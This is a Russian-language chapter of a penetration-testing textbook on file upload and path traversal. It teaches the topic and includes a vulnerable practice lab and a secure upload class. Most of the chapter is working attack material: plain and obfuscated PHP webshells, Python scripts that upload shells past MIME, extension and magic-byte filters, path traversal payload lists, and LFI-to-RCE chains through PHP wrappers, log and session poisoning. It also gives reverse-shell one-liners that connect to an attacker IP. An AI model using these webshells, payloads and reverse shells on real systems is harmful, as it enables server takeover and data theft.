# Глава 11.5: File Upload и Path Traversal

## 🎯 Цели главы

К концу этой главы вы будете уметь:

- Эксплуатировать уязвимости загрузки файлов для получения удалённого выполнения кода
- Обходить фильтры по MIME-типу, расширению и содержимому файла
- Проводить Path Traversal атаки и их вариации
- Понимать разницу между LFI и RFI и эксплуатировать каждый вид
- Использовать LFI для получения RCE через PHP wrappers и log poisoning
- Работать с webshells разного типа
- Настраивать защиту от атак загрузки файлов
- Создавать собственный лабораторный стенд на PHP

---

## 11.5.1 File Upload уязвимости: основы

### Почему загрузка файлов опасна

```
МОДЕЛЬ УГРОЗ FILE UPLOAD:
===========================

Атакующий загружает:          Последствия:
+------------------+         +------------------------+
| PHP webshell     |-------->| RCE (Remote Code Exec) |
+------------------+         +------------------------+
| HTML с JS        |-------->| Stored XSS             |
+------------------+         +------------------------+
| XML/SVG          |-------->| XXE Injection           |
+------------------+         +------------------------+
| ZIP bomb         |-------->| DoS (распаковка)        |
+------------------+         +------------------------+
| ../../../etc/... |-------->| Path Traversal в имени |
+------------------+         +------------------------+
| Бинарный файл    |-------->| Buffer Overflow (парсер)|
+------------------+         +------------------------+

ЦЕЛЬ: Сервер выполняет загруженный нами код!
```

### Создание PHP Webshell

```php
<?php
// ===========================================
// БАЗОВЫЙ WEBSHELL (минимальный)
// ===========================================
<?php system($_GET['cmd']); ?>

// ===========================================
// БОЛЕЕ ФУНКЦИОНАЛЬНЫЙ WEBSHELL
// ===========================================
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
}
?>

// ===========================================
// WEBSHELL С АУТЕНТИФИКАЦИЕЙ (для реального пентеста)
// ===========================================
<?php
define('PASSWORD', 'pentest_secret_2024');
if(!isset($_POST['pass']) || $_POST['pass'] !== PASSWORD) {
    die('<form method="POST"><input name="pass" type="password"><input type="submit"></form>');
}
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = '';
    // Пробуем разные функции (некоторые могут быть отключены)
    $functions = ['system', 'exec', 'shell_exec', 'passthru', 'popen'];
    foreach($functions as $func) {
        if(function_exists($func) && !in_array($func, explode(',', ini_get('disable_functions')))) {
            ob_start();
            $func($cmd);
            $output = ob_get_clean();
            break;
        }
    }
    if(empty($output)) {
        // Fallback: proc_open
        $proc = proc_open($cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
        $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
        proc_close($proc);
    }
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
<form method="POST">
    <input name="pass" type="hidden" value="<?= htmlspecialchars($_POST['pass'] ?? '') ?>">
    <input name="cmd" value="id" style="width:500px">
    <input type="submit" value="Execute">
</form>

// ===========================================
// МИНИМАЛЬНЫЙ ОБФУСЦИРОВАННЫЙ WEBSHELL
// (для обхода сигнатурных фильтров)
// ===========================================
<?php $f=base64_decode('c3lzdGVt');$f($_GET[0]); ?>
// system($_GET[0]) в base64

// Ещё вариант через переменные:
<?php $_=[];$_[]=+[];$__=$_;$_[]=++$_[0];// ... (сложная обфускация)
```

### Загрузка Webshell: базовый сценарий

```python
#!/usr/bin/env python3
"""
File Upload Exploitation Tool
Тест загрузки вредоносных файлов
"""

import requests
import io

TARGET_URL = "http://target.com/upload"
UPLOAD_URL = "http://target.com/uploads/"

def upload_webshell_basic(session: requests.Session) -> str:
    """
    Базовая попытка загрузки webshell.php
    """
    shell_content = '<?php system($_GET["cmd"]); ?>'
    
    files = {
        'file': ('shell.php', shell_content, 'application/octet-stream')
    }
    
    response = session.post(TARGET_URL, files=files)
    print(f"Статус: {response.status_code}")
    print(f"Ответ: {response.text[:300]}")
    
    return response

def test_webshell(shell_url: str, cmd: str = "id") -> str:
    """Тест выполнения команды через загруженный shell."""
    resp = requests.get(f"{shell_url}?cmd={cmd}", timeout=10)
    return resp.text

# Пробуем загрузить и выполнить
result = upload_webshell_basic(requests.Session())
print(test_webshell(f"{UPLOAD_URL}shell.php", "id"))
```

---

## 11.5.2 Техники обхода фильтров

### Обход по расширению файла

```
СТРАТЕГИИ ОБХОДА РАСШИРЕНИЯ:
==============================

1. АЛЬТЕРНАТИВНЫЕ PHP-РАСШИРЕНИЯ:
   .php .php3 .php4 .php5 .php7 .phtml .phar .phps
   .PHP .PhP .pHp (регистр)
   
2. ДВОЙНЫЕ РАСШИРЕНИЯ:
   shell.php.jpg
   shell.jpg.php
   Сервер обрабатывает по ПЕРВОМУ или ПОСЛЕДНЕМУ расширению?
   
3. NULL BYTE (старые версии PHP):
   shell.php%00.jpg
   shell.php\x00.jpg
   PHP < 5.3.4 обрезает строку на null byte
   
4. СПЕЦИАЛЬНЫЕ СИМВОЛЫ:
   shell.php%20     (пробел)
   shell.php%0a     (новая строка)
   shell.php.       (точка в конце — Windows игнорирует)
   shell.php::$DATA (NTFS ADS — Windows)
   
5. UNICODE / ENCODING:
   shell.php%ef%bc%8ephp  (fullwidth dot)
   
6. .htaccess ЗАГРУЗКА:
   Загрузить .htaccess с содержимым:
   AddType application/x-httpd-php .jpg
   Теперь .jpg будет выполняться как PHP!
   Затем загрузить shell.jpg
```

### Обход по MIME-типу и Content-Type

```python
#!/usr/bin/env python3
"""
Техники обхода фильтров загрузки файлов
"""

import requests

TARGET = "http://target.com/upload.php"
WEBSHELL = b'<?php system($_GET["cmd"]); ?>'

def upload_with_mime_bypass(session: requests.Session, 
                             mime_type: str, filename: str) -> dict:
    """Загрузка с поддельным MIME-типом."""
    
    files = {
        'file': (filename, WEBSHELL, mime_type)
    }
    resp = session.post(TARGET, files=files)
    return {'status': resp.status_code, 'body': resp.text[:200]}


# ============================================================
# ТЕСТ 1: Поддельный Content-Type
# ============================================================
# Сервер проверяет Content-Type заголовок → подделываем
strategies = [
    ("image/jpeg", "shell.php"),
    ("image/png", "shell.php"),
    ("image/gif", "shell.php"),
    ("application/octet-stream", "shell.php"),
]

for mime, filename in strategies:
    result = upload_with_mime_bypass(requests.Session(), mime, filename)
    print(f"MIME: {mime} | File: {filename} → {result}")


# ============================================================
# ТЕСТ 2: Magic Bytes / File Header подделка
# Сервер проверяет первые байты файла (magic bytes)
# ============================================================

def upload_with_magic_bytes(session: requests.Session) -> None:
    """
    Добавляем magic bytes изображения перед PHP-кодом.
    GIF89a = magic bytes для GIF файла.
    """
    
    # GIF header + PHP code
    gif_header = b'GIF89a'  # Magic bytes для GIF
    php_code = b'\n<?php system($_GET["cmd"]); ?>'
    
    content = gif_header + php_code
    
    files = {'file': ('shell.gif', content, 'image/gif')}
    resp = session.post(TARGET, files=files)
    print(f"GIF+PHP upload: {resp.status_code}")
    
    # PNG magic bytes
    png_header = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
    content = png_header + b'\n<?php system($_GET["cmd"]); ?>'
    
    files = {'file': ('shell.png', content, 'image/png')}
    resp = session.post(TARGET, files=files)
    print(f"PNG+PHP upload: {resp.status_code}")


# ============================================================
# ТЕСТ 3: Загрузка через .htaccess
# ============================================================

def upload_htaccess_then_shell(session: requests.Session) -> None:
    """
    Шаг 1: Загрузить .htaccess для изменения обработчика PHP
    Шаг 2: Загрузить shell с нужным расширением
    """
    
    # Шаг 1: Загружаем .htaccess
    htaccess_content = b'AddType application/x-httpd-php .jpg\n'
    htaccess_content += b'php_value auto_prepend_file none\n'
    
    files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
    resp = session.post(TARGET, files=files)
    print(f"htaccess upload: {resp.status_code}")
    
    # Шаг 2: Загружаем shell.jpg (будет выполнен как PHP!)
    files = {'file': ('shell.jpg', WEBSHELL, 'image/jpeg')}
    resp = session.post(TARGET, files=files)
    print(f"shell.jpg upload: {resp.status_code}")


# ============================================================
# ТЕСТ 4: Двойное расширение
# ============================================================

double_ext_attempts = [
    "shell.php.jpg",
    "shell.jpg.php",
    "shell.php5.jpg",
    "shell.phtml.jpg",
    "shell.php%00.jpg",
    "shell.php\x00.jpg",
]

for filename in double_ext_attempts:
    try:
        files = {'file': (filename, WEBSHELL, 'image/jpeg')}
        resp = requests.post(TARGET, files=files, timeout=10)
        print(f"  {filename}: {resp.status_code} — {resp.text[:50]}")
    except Exception as e:
        print(f"  {filename}: ошибка {e}")
```

### Обход с использованием exiftool

```bash
# Вставка PHP-кода в метаданные изображения
# Сервер проверяет содержимое изображения, но читает метаданные

# Создать изображение с PHP в EXIF Comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' normal.jpg
mv normal.jpg shell.jpg

# Создать изображение с PHP в IPTC поле
exiftool -IPTC:Caption-Abstract='<?php system($_GET["cmd"]); ?>' image.jpg

# Проверить встроенный код
exiftool shell.jpg | grep -i php

# Важно: если сервер ресайзит изображение — код уничтожается!
# Ищите эндпоинты, которые возвращают оригинальный файл.
```

### Обход через SVG (XSS и XXE)

```xml
<!-- SVG файл с XSS -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie)
  </script>
</svg>

<!-- SVG файл с XXE (чтение файлов сервера) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## 11.5.3 Path Traversal: теория и практика

### Основы Path Traversal

```
PATH TRAVERSAL — КАК РАБОТАЕТ:
================================

Уязвимый код PHP:
  $file = $_GET['file'];
  include('/var/www/html/pages/' . $file);

Нормальный запрос:
  GET /page.php?file=about.php
  → include('/var/www/html/pages/about.php') ✓

Атака:
  GET /page.php?file=../../../etc/passwd
  → include('/var/www/html/pages/../../../etc/passwd')
  → include('/etc/passwd') ← ЧИТАЕМ СИСТЕМНЫЙ ФАЙЛ!

СТРУКТУРА ПУТИ:
/var/www/html/pages/
   ↑         ↑       ↑
   ../  = /var/www/html/
   ../../   = /var/www/
   ../../../  = /var/
   ../../../../ = /
```

### Практические payload'ы

```
БАЗОВЫЕ PAYLOAD'ы PATH TRAVERSAL:
===================================

../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd        (URL encoding)
..%252F..%252F..%252Fetc%252Fpasswd (двойное URL encoding)
....//....//....//etc/passwd         (обход простой замены ../)
..\/..\/..\/etc\/passwd              (смешанные разделители)
/etc/passwd                          (абсолютный путь)
%2Fetc%2Fpasswd                     (URL encoded абсолютный)

WINDOWS:
..\..\..\Windows\System32\drivers\etc\hosts
..%5C..%5C..%5CWindows%5Csystem.ini

ПОЛЕЗНЫЕ ФАЙЛЫ ДЛЯ ЧТЕНИЯ:
============================
/etc/passwd          — Список пользователей
/etc/shadow          — Хэши паролей (только root)
/etc/hosts           — DNS записи локальные
/etc/hostname        — Имя хоста
/etc/os-release      — Версия ОС
/etc/crontab         — Cron задачи
/proc/self/environ   — Переменные окружения процесса
/proc/self/cmdline   — Командная строка процесса
/proc/net/tcp        — Открытые TCP соединения
/proc/version        — Версия ядра Linux
~/.ssh/id_rsa        — Приватный SSH ключ (если доступен)
~/.bash_history      — История команд
/var/log/apache2/access.log  — Лог Apache
/var/log/nginx/access.log    — Лог Nginx
/var/log/auth.log    — Лог аутентификации
```

```python
#!/usr/bin/env python3
"""
Path Traversal тест — автоматизированный сканер
"""

import requests
from typing import Optional

def test_path_traversal(base_url: str, param: str) -> None:
    """
    Автоматически тестирует path traversal payload'ы.
    """
    
    payloads = [
        # Базовые
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        # URL encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # Double encoded
        "..%252F..%252F..%252Fetc%252Fpasswd",
        # Mixed separators
        "..\\..\\..\\etc\\passwd",
        "..\\/..\\/..\\/etc\\/passwd",
        # Filter bypass
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        # Absolute path
        "/etc/passwd",
        "%2Fetc%2Fpasswd",
        # Null byte (старые PHP)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
    ]
    
    # Индикатор успеха: содержимое /etc/passwd начинается с "root:"
    success_indicator = "root:"
    
    print(f"Тестируем: {base_url}?{param}=<payload>")
    print("="*60)
    
    for payload in payloads:
        try:
            params = {param: payload}
            resp = requests.get(base_url, params=params, timeout=10)
            
            if success_indicator in resp.text:
                print(f"[УЯЗВИМОСТЬ!] {payload}")
                # Показать первые строки /etc/passwd
                lines = [l for l in resp.text.split('\n') if ':' in l][:3]
                for line in lines:
                    print(f"  {line}")
            else:
                print(f"[  ] {payload[:50]}... → {resp.status_code}")
                
        except Exception as e:
            print(f"[ERR] {payload[:30]}...: {e}")

# Запуск теста
test_path_traversal("http://target.com/view", "file")
```

### Обход защиты от Path Traversal

```
ТИПИЧНЫЕ ЗАЩИТЫ И КАК ИХ ОБХОДИТЬ:
======================================

ЗАЩИТА 1: Удаление ../ из входных данных
  str_replace('../', '', $input)
  ОБХОД: ....// → после удаления ../ получим ../
         ....\/
         Тест: ....//....//etc/passwd

ЗАЩИТА 2: URL-декодирование и удаление
  urldecode($input) + str_replace('../', '')
  ОБХОД: Двойное кодирование %252F
         %25 → % при первом decode, затем %2F → /

ЗАЩИТА 3: Проверка начала пути
  if (strpos($file, '/var/www') !== 0) { die(); }
  ОБХОД: /var/www/html/../../etc/passwd
         /var/www/../../../etc/passwd

ЗАЩИТА 4: realpath() проверка
  if (strpos(realpath($path), $base) !== 0) { die(); }
  realpath() разрешает все ../
  ОБХОД: Труднее обойти. Ищем race condition или symlink.

ЛУЧШАЯ ЗАЩИТА (PHP):
  // Использовать basename() для имени файла
  $filename = basename($input);
  // Или: realpath + проверка
  $realpath = realpath($base_dir . $input);
  if ($realpath === false || strpos($realpath, $base_dir) !== 0) {
      die('Доступ запрещён');
  }
```

---

## 11.5.4 LFI vs RFI: подробный разбор

### Local File Inclusion (LFI)

```php
<?php
// УЯЗВИМЫЙ КОД — LFI
$page = $_GET['page'];
include($page . '.php');  // Добавляет .php в конец

// АТАКИ:
// 1. Нет суффикса .php → читаем любые файлы
// 2. Есть суффикс → нужен null byte (PHP < 5.3)
//    ?page=../../../etc/passwd%00
//    %00 обрезает строку → include('/etc/passwd')

// ЕЩЁ УЯЗВИМЫЙ КОД
$template = $_GET['template'];
include('/templates/' . $template);
// ?template=../../../etc/passwd — без суффикса, работает!

// ЗАЩИЩЁННЫЙ КОД
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed)) {
    $page = 'home';
}
include('/templates/' . $page . '.php');
?>
```

### Remote File Inclusion (RFI)

```php
<?php
// УЯЗВИМЫЙ КОД — RFI (требует allow_url_include=On в php.ini)
$page = $_GET['page'];
include($page);

// АТАКА:
// ?page=http://attacker.com/shell.php
// PHP загружает и выполняет удалённый файл!

// ПРОВЕРКА УЯЗВИМОСТИ:
// 1. Нужно: allow_url_include=On AND allow_url_fopen=On
// 2. В современных PHP (>= 5.2) allow_url_include=Off по умолчанию
// 3. RFI = более редкая, но критичная уязвимость

// Как проверить через LFI:
// ?page=http://127.0.0.1/test.txt
// Если подключается — RFI работает
?>
```

---

## 11.5.5 LFI → RCE: продвинутые техники

### Техника 1: PHP Wrappers

```bash
# PHP поставляется со встроенными "оберёртками" для потоков
# Используем их для LFI → чтение кода / RCE

# ============================================================
# WRAPPER: php://filter — чтение исходного кода (не выполнение!)
# ============================================================
# Читаем index.php в base64 (чтобы не выполнился как PHP)
curl "http://target.com/lfi.php?page=php://filter/convert.base64-encode/resource=index.php"

# Декодируем результат
echo "ПОЛУЧЕННЫЙ_BASE64" | base64 -d

# Более полный вариант чтения PHP файла:
curl "http://target.com/?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"

# ============================================================
# WRAPPER: data:// — выполнение кода (если allow_url_include=On)
# ============================================================
# Выполняем PHP код напрямую через data:// wrapper
curl "http://target.com/?page=data://text/plain,<?php%20system('id');%20?>"

# Base64 encoded payload:
# <?php system('id'); ?> → PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
curl "http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# ============================================================
# WRAPPER: input:// — POST-тело как PHP (если allow_url_include=On)
# ============================================================
curl -X POST "http://target.com/?page=php://input" \
  --data-binary '<?php system($_GET["cmd"]); ?>'

# ============================================================
# WRAPPER: expect:// — прямое выполнение команд (редко доступен)
# ============================================================
curl "http://target.com/?page=expect://id"
```

### Техника 2: Log Poisoning

```bash
# LOG POISONING — инъекция PHP кода в лог-файл, затем его чтение через LFI
# Условия: 1) LFI работает  2) Можем читать лог-файл

# ============================================================
# ШАГ 1: Определяем путь к логу
# ============================================================
# Стандартные пути логов:
# Apache: /var/log/apache2/access.log
#         /var/log/apache2/error.log
#         /var/log/httpd/access_log  (CentOS/RHEL)
# Nginx:  /var/log/nginx/access.log
#         /var/log/nginx/error.log
# SSH:    /var/log/auth.log
#         /var/log/secure  (CentOS/RHEL)
# Mail:   /var/log/mail.log

# ============================================================
# ШАГ 2: Проверяем чтение через LFI
# ============================================================
curl "http://target.com/?page=../../../var/log/apache2/access.log"
# Если видим лог — уязвимость работает!

# ============================================================
# ШАГ 3: Отравляем лог (инъекция PHP в User-Agent)
# ============================================================
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target.com/"
# Теперь в лог записалась строка с PHP-кодом!

# ============================================================
# ШАГ 4: Читаем лог через LFI = выполняем код
# ============================================================
curl "http://target.com/?page=../../../var/log/apache2/access.log&cmd=id"
# Лог читается → PHP код выполняется!

# ============================================================
# SSH Log Poisoning
# ============================================================
# Инъекция в SSH-лог через попытку входа с PHP именем пользователя
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Неудачный вход записывается в /var/log/auth.log
# Затем: ?page=/var/log/auth.log&cmd=id
```

### Техника 3: /proc/self/fd и /proc/self/environ

```bash
# /proc/self/environ содержит переменные окружения процесса
# Включает HTTP_USER_AGENT → можем отравить!

# Шаг 1: Инъекция через User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target.com/"

# Шаг 2: Чтение через LFI
curl "http://target.com/?page=/proc/self/environ&cmd=id"

# ============================================================
# /proc/self/fd/ — файловые дескрипторы процесса
# ============================================================
# Apache обычно держит открытым access.log через fd
# fd/0 = stdin, fd/1 = stdout, fd/2 = stderr
# fd/3+ = открытые файлы (лог-файлы!)

# Брутфорс номера дескриптора
for i in $(seq 0 30); do
  echo -n "fd/$i: "
  curl -s "http://target.com/?page=/proc/self/fd/$i" | head -c 100
  echo
done

# Обычно fd/6 или fd/7 = access.log для Apache
```

### Техника 4: PHP Session файлы

```bash
# PHP session файлы хранятся в /tmp/sess_SESSIONID
# Если мы можем контролировать содержимое сессии → LFI → RCE

# Шаг 1: Узнать путь к session файлам
# По умолчанию: /tmp/sess_PHPSESSID
# Или: /var/lib/php/sessions/sess_PHPSESSID

# Шаг 2: Получить наш PHPSESSID
curl -v "http://target.com/" | grep PHPSESSID
# PHPSESSID = abc123xyz

# Шаг 3: Вставить PHP код в сессионную переменную
curl "http://target.com/profile.php?name=<?php+system(\$_GET['cmd']);+?>" \
  -H "Cookie: PHPSESSID=abc123xyz"
# Если name сохраняется в $_SESSION['name'] → попадает в файл сессии

# Шаг 4: Читаем session файл через LFI
curl "http://target.com/?page=/tmp/sess_abc123xyz&cmd=id"

# ============================================================
# PHPINFO() → session.save_path
# ============================================================
# Если доступен phpinfo() — можно узнать точный путь
curl "http://target.com/?page=/proc/self/fd/5" | grep "session.save_path"
```

### Техника 5: Загрузка файлов + LFI

```bash
# Если есть загрузка файлов И LFI — готовый RCE

# Шаг 1: Загрузить PHP-код внутри изображения
# Файл: shell.jpg с содержимым: GIF89a<?php system($_GET['cmd']); ?>

# Шаг 2: Узнать путь загруженного файла из ответа сервера

# Шаг 3: Выполнить через LFI
curl "http://target.com/?page=../uploads/shell.jpg&cmd=id"
```

---

## 11.5.6 Webshells: популярные варианты

### Классификация webshells

```
ВИДЫ WEBSHELLS ПО ФУНКЦИОНАЛУ:
================================

МИНИМАЛЬНЫЕ (обнаружение труднее):
  <?php system($_GET['c']); ?>
  <?php `$_GET[c]`; ?>
  <?php eval($_POST['e']); ?>
  
СРЕДНИЕ (баланс функций / сложности):
  b374k shell      — файловый менеджер + команды
  c99 shell        — классика, много функций
  r57 shell        — старый, но популярный

ПОЛНОФУНКЦИОНАЛЬНЫЕ (легко обнаруживаются):
  WSO Shell        — Web Shell by Orb
  IndoXploit       — с SQL клиентом
  
СОВРЕМЕННЫЕ / STEALTH:
  Weevely (Python) — трафик похож на обычный HTTP
  Behinder         — Java, шифрованный C2
  Godzilla         — продвинутый, шифрование AES
```

### Weevely: профессиональный webshell

```bash
# Установка
apt install weevely  # Kali Linux

# Создание зашифрованного агента
weevely generate mypassword /tmp/agent.php
# Создаёт agent.php — выглядит как набор случайных строк

# Загружаем agent.php на сервер

# Подключение к агенту
weevely http://target.com/uploads/agent.php mypassword

# После подключения — интерактивный shell:
# weevely> id
# uid=33(www-data) gid=33(www-data)
# weevely> ls -la
# weevely> :file_download /etc/passwd local_copy.txt

# Встроенные команды Weevely:
# :shell_su          — смена пользователя
# :file_upload       — загрузка файла на сервер
# :file_download     — скачивание файла
# :sql_console       — SQL консоль
# :net_scan          — сканирование сети
# :system_info       — информация о системе
```

### Reverse Shell через Webshell

```bash
# После получения RCE через webshell — получаем interactive reverse shell

# На нашей машине запускаем listener
nc -nlvp 4444

# Через webshell выполняем reverse shell:

# Bash
curl "http://target.com/shell.php?cmd=bash+-i+>%26+/dev/tcp/OUR_IP/4444+0>%261"

# Python
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('OUR_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# netcat (busybox версия)
curl "http://target.com/shell.php?cmd=nc+OUR_IP+4444+-e+/bin/sh"

# PHP (если нет отдельного shell)
php -r '$sock=fsockopen("OUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# ============================================================
# УЛУЧШЕНИЕ SHELL (PTY upgrade)
# ============================================================
# После получения reverse shell — апгрейд до интерактивного TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (фон)
stty raw -echo; fg
# Enter
export TERM=xterm
stty rows 40 cols 200
```

---

## 11.5.7 Создание лабораторного стенда на PHP

### Уязвимое PHP-приложение для практики

```php
<?php
// ============================================================
// LAB: Уязвимое приложение для практики File Upload + LFI
// ТОЛЬКО ДЛЯ ЛОКАЛЬНОЙ ТРЕНИРОВКИ!
// ============================================================

// Структура проекта:
// /var/www/html/lab/
//   index.php     — главная с навигацией
//   upload.php    — уязвимая загрузка файлов
//   view.php      — уязвимый LFI
//   uploads/      — директория загруженных файлов

// ============================================================
// upload.php — УЯЗВИМАЯ ЗАГРУЗКА (намеренно)
// ============================================================
?>
<!DOCTYPE html>
<html>
<head><title>File Upload Lab</title></head>
<body>
<h1>Загрузка файла</h1>

<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $upload_dir = './uploads/';
    
    // УЯЗВИМОСТЬ 1: Проверка только расширения, не MIME
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if(in_array($ext, $allowed_ext)) {
        $dest = $upload_dir . $file['name'];  // УЯЗВИМОСТЬ 2: оригинальное имя файла
        if(move_uploaded_file($file['tmp_name'], $dest)) {
            echo "<p style='color:green'>Загружено: <a href='$dest'>$dest</a></p>";
        }
    } else {
        echo "<p style='color:red'>Ошибка: разрешены только jpg, jpeg, png, gif</p>";
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file"><br><br>
    <input type="submit" value="Загрузить">
</form>

<h2>Загруженные файлы:</h2>
<?php
foreach(glob('./uploads/*') as $f) {
    echo "<a href='$f'>$f</a><br>";
}
?>

</body>
</html>
```

```php
<?php
// ============================================================
// view.php — УЯЗВИМЫЙ LFI (намеренно)
// ============================================================
?>
<!DOCTYPE html>
<html>
<head><title>LFI Lab</title></head>
<body>
<h1>Просмотр файла</h1>

<?php
// УЯЗВИМОСТЬ: Прямое использование пользовательского ввода в include
$file = $_GET['file'] ?? 'welcome.txt';

// Попытка "защиты" (которую можно обойти)
$file = str_replace('../', '', $file);  // Легко обходится: ....//

echo "<h2>Содержимое файла: " . htmlspecialchars($file) . "</h2>";
echo "<pre>";
// УЯЗВИМОСТЬ: include вместо file_get_contents = LFI → RCE!
if(file_exists($file)) {
    include($file);
} else {
    echo "Файл не найден";
}
echo "</pre>";
?>

<h2>Тесты для практики:</h2>
<ul>
    <li><a href="?file=welcome.txt">Нормальный запрос</a></li>
    <li><a href="?file=../../../etc/passwd">Path Traversal</a></li>
    <li><a href="?file=....//....//....//etc/passwd">Обход защиты</a></li>
    <li><a href="?file=php://filter/convert.base64-encode/resource=view.php">PHP wrapper</a></li>
</ul>

</body>
</html>
```

### Docker-стенд для быстрого развёртывания

```dockerfile
# Dockerfile для уязвимого PHP-стенда
FROM php:7.4-apache

# Включаем уязвимые настройки
RUN echo "allow_url_fopen = On" >> /usr/local/etc/php/php.ini && \
    echo "allow_url_include = On" >> /usr/local/etc/php/php.ini && \
    echo "display_errors = On" >> /usr/local/etc/php/php.ini

# Устанавливаем нужные расширения
RUN docker-php-ext-install pdo pdo_mysql

# Создаём директорию для загрузок с правами
RUN mkdir -p /var/www/html/uploads && \
    chmod 777 /var/www/html/uploads

# Копируем уязвимый код (создайте файлы upload.php и view.php выше)
COPY . /var/www/html/

# Включаем .htaccess (для mod_security тестирования)
RUN a2enmod rewrite

EXPOSE 80
```

```yaml
# docker-compose.yml
version: '3'
services:
  vuln-php:
    build: .
    ports:
      - "8080:80"
    volumes:
      - ./src:/var/www/html
    environment:
      - PHP_DISPLAY_ERRORS=1
  
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: testdb
    ports:
      - "3306:3306"
```

```bash
# Запуск стенда
docker-compose up -d

# Теперь практикуйтесь:
# http://localhost:8080/upload.php
# http://localhost:8080/view.php

# Попробуйте:
# 1. Загрузить shell.php напрямую
# 2. Загрузить shell.php.jpg
# 3. Загрузить shell.gif с magic bytes + PHP
# 4. Читать /etc/passwd через view.php
# 5. Log poisoning через User-Agent
```

---

## 11.5.8 Защита от File Upload атак

### Комплексная защита

```php
<?php
// ============================================================
// ЗАЩИЩЁННЫЙ ОБРАБОТЧИК ЗАГРУЗКИ ФАЙЛОВ
// ============================================================

class SecureFileUpload {
    
    private string $upload_dir;
    private array $allowed_types;
    private int $max_size;
    
    public function __construct(
        string $upload_dir = '/var/www/storage/uploads/',
        array $allowed_types = ['image/jpeg', 'image/png', 'image/gif'],
        int $max_size = 5 * 1024 * 1024  // 5MB
    ) {
        $this->upload_dir = $upload_dir;
        $this->allowed_types = $allowed_types;
        $this->max_size = $max_size;
    }
    
    public function handle(array $file): array {
        try {
            $this->validateError($file);
            $this->validateSize($file);
            $this->validateMimeType($file);
            $this->validateMagicBytes($file);
            $safe_name = $this->generateSafeName($file);
            $final_path = $this->saveFile($file, $safe_name);
            
            return ['success' => true, 'path' => $final_path];
            
        } catch (\Exception $e) {
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }
    
    private function validateError(array $file): void {
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new \Exception("Ошибка загрузки: {$file['error']}");
        }
    }
    
    private function validateSize(array $file): void {
        if ($file['size'] > $this->max_size) {
            throw new \Exception("Файл слишком большой");
        }
    }
    
    private function validateMimeType(array $file): void {
        // Проверка MIME через finfo (не полагаемся на Content-Type!)
        $finfo = new \finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($file['tmp_name']);
        
        if (!in_array($mime, $this->allowed_types)) {
            throw new \Exception("Недопустимый тип файла: {$mime}");
        }
    }
    
    private function validateMagicBytes(array $file): void {
        // Дополнительно: проверка magic bytes для изображений
        $handle = fopen($file['tmp_name'], 'rb');
        $header = fread($handle, 8);
        fclose($handle);
        
        $magic_bytes = [
            'jpeg' => ["\xFF\xD8\xFF"],
            'png'  => ["\x89PNG\r\n\x1a\n"],
            'gif'  => ["GIF87a", "GIF89a"],
        ];
        
        $valid = false;
        foreach ($magic_bytes as $type => $signatures) {
            foreach ($signatures as $sig) {
                if (strncmp($header, $sig, strlen($sig)) === 0) {
                    $valid = true;
                    break 2;
                }
            }
        }
        
        if (!$valid) {
            throw new \Exception("Файл не является валидным изображением");
        }
        
        // Дополнительная проверка для изображений: getimagesize()
        if (!getimagesize($file['tmp_name'])) {
            throw new \Exception("Файл повреждён или не является изображением");
        }
    }
    
    private function generateSafeName(array $file): string {
        // Генерируем уникальное случайное имя, не используем оригинальное!
        $extension = $this->getSafeExtension($file['tmp_name']);
        return bin2hex(random_bytes(16)) . '.' . $extension;
    }
    
    private function getSafeExtension(string $tmp_path): string {
        $finfo = new \finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($tmp_path);
        
        $map = [
            'image/jpeg' => 'jpg',
            'image/png'  => 'png',
            'image/gif'  => 'gif',
        ];
        
        return $map[$mime] ?? 'bin';
    }
    
    private function saveFile(array $file, string $safe_name): string {
        // Директория хранения НЕ должна быть в веб-корне!
        // Используем абсолютный путь вне public_html
